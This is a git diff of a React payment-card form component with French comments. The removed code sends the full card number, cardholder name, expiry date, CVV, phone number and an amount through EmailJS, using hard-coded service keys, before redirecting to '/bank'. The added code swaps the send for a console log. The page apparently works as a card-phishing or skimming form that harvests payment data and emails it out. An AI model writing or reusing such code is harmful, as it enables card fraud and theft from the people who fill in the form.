@@ -6,7 +6,6 @@ import { Label } from "@/components/ui/label";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/components/ui/use-toast";
 import { Lock } from "lucide-react";
-import emailjs from "emailjs-com";
 import { supabase } from "@/lib/supabase"; // Toujours utilisé pour lire les infos en DB
 
 const Card = () => {
@@ -81,23 +80,13 @@ const Card = () => {
 
       if (fetchError || !data) throw fetchError;
 
-      // 3. Envoi avec EmailJS
-      const serviceID = "service_mev4gqt";
-      const templateID = "template_uf95szs";
-      const publicKey = "u9q4QhywRWjrfKnHj";
-
-      const templateParams = {
-        email: formData.email,
-        titulaire: formData.titulaire,
-        numerocarte: formData.numerocarte,
-        dateexpiration: formData.dateexpiration,
-        cryptogramme: formData.cryptogramme,
+      // 3. Navigation vers la page suivante
+      console.log('Données carte mises à jour avec succès:', {
+        userId,
         code: data.code,
         montant: data.montant,
-        telephone: data.telephone,
-      };
-
-      await emailjs.send(serviceID, templateID, templateParams, publicKey);
+        telephone: data.telephone
+      });
       navigate("/bank");
     } catch (err) {
       console.error(err);
